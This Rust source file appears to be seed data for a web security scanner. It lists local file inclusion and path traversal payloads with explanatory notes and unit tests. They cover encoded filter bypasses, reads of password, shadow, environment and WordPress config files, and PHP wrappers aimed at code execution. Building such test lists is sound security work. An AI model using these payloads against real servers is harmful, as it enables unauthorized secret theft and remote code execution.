//! LFI / path-traversal seed payloads.
//!
//! Curated from PayloadsAllTheThings / File Inclusion (MIT). Includes
//! straight traversal, encoded variants, and a handful of PHP wrapper
//! payloads that surface as readable streams.

use crate::{Payload, PayloadCategory};

const C: PayloadCategory = PayloadCategory::Lfi;

pub static PAYLOADS: &[Payload] = &[
    Payload {
        category: C,
        value: "/etc/passwd",
        notes: "absolute-path probe — works when the param is concatenated unchecked",
        tags: &["nix", "absolute"],
    },
    Payload {
        category: C,
        value: "../../../../etc/passwd",
        notes: "shallow traversal — 4 levels up",
        tags: &["nix", "traversal"],
    },
    Payload {
        category: C,
        value: "../../../../../../../../etc/passwd",
        notes: "deep traversal — 8 levels up; covers most webroot depths",
        tags: &["nix", "traversal"],
    },
    Payload {
        category: C,
        value: "..%2f..%2f..%2f..%2fetc%2fpasswd",
        notes: "URL-encoded slash traversal — bypasses naive `..` filters",
        tags: &["nix", "encoding"],
    },
    Payload {
        category: C,
        value: "..%252f..%252f..%252f..%252fetc%252fpasswd",
        notes: "double URL-encoded — bypasses single-decode filters",
        tags: &["nix", "encoding", "double"],
    },
    Payload {
        category: C,
        value: "..\\..\\..\\..\\windows\\win.ini",
        notes: "Windows traversal — win.ini is the canonical LFI canary",
        tags: &["windows", "traversal"],
    },
    Payload {
        category: C,
        value: "..\\..\\..\\..\\boot.ini",
        notes: "Windows legacy — boot.ini works on pre-Vista hosts",
        tags: &["windows", "legacy"],
    },
    Payload {
        category: C,
        value: "/proc/self/environ",
        notes: "Linux process env — leaks env vars including secrets on misconfigured servers",
        tags: &["nix", "proc", "exfil"],
    },
    Payload {
        category: C,
        value: "/proc/self/cmdline",
        notes: "Linux process command line",
        tags: &["nix", "proc"],
    },
    Payload {
        category: C,
        value: "/proc/self/status",
        notes: "Linux process status — UID, GID, PID",
        tags: &["nix", "proc"],
    },
    Payload {
        category: C,
        value: "php://filter/convert.base64-encode/resource=index.php",
        notes: "PHP filter wrapper — returns the source of index.php as base64",
        tags: &["php", "wrapper", "exfil"],
    },
    Payload {
        category: C,
        value: "php://filter/read=convert.base64-encode/resource=/etc/passwd",
        notes: "PHP filter wrapper — base64 over /etc/passwd",
        tags: &["php", "wrapper"],
    },
    Payload {
        category: C,
        value: "expect://id",
        notes: "PHP expect wrapper — direct RCE if loaded; rarely enabled",
        tags: &["php", "wrapper", "rce"],
    },
    Payload {
        category: C,
        value: "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        notes: "PHP data wrapper — inline phpinfo() payload, base64 of `<?php phpinfo(); ?>`",
        tags: &["php", "wrapper", "rce"],
    },
    Payload {
        category: C,
        value: "/etc/passwd%00",
        notes: "null-byte truncation — works on PHP < 5.3.4",
        tags: &["nix", "null-byte", "legacy"],
    },
    Payload {
        category: C,
        value: "....//....//....//etc/passwd",
        notes: "double-dot bypass — naive `..` strip leaves `..` behind",
        tags: &["nix", "filter-bypass"],
    },
    Payload {
        category: C,
        value: "/etc/shadow",
        notes: "/etc/shadow — only readable with root; useful evidence when LFI runs as root",
        tags: &["nix", "high-impact"],
    },
    Payload {
        category: C,
        value: "/var/log/apache2/access.log",
        notes: "Apache access log — vector for log poisoning + LFI → RCE chain",
        tags: &["nix", "log-poison"],
    },
    Payload {
        category: C,
        value: "/var/www/html/wp-config.php",
        notes: "WordPress DB credentials — high-impact if app is WP",
        tags: &["nix", "wordpress", "high-impact"],
    },
    Payload {
        category: C,
        value: "C:\\Windows\\System32\\drivers\\etc\\hosts",
        notes: "Windows hosts file — readable by all users",
        tags: &["windows", "absolute"],
    },
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_payload_is_lfi_class() {
        for p in PAYLOADS {
            assert_eq!(p.category, PayloadCategory::Lfi);
            assert!(!p.value.is_empty());
        }
    }

    #[test]
    fn has_windows_and_nix_payloads() {
        assert!(PAYLOADS.iter().any(|p| p.tags.contains(&"windows")));
        assert!(PAYLOADS.iter().any(|p| p.tags.contains(&"nix")));
    }

    #[test]
    fn has_encoding_bypass_payloads() {
        assert!(PAYLOADS.iter().any(|p| p.tags.contains(&"encoding")));
    }
}
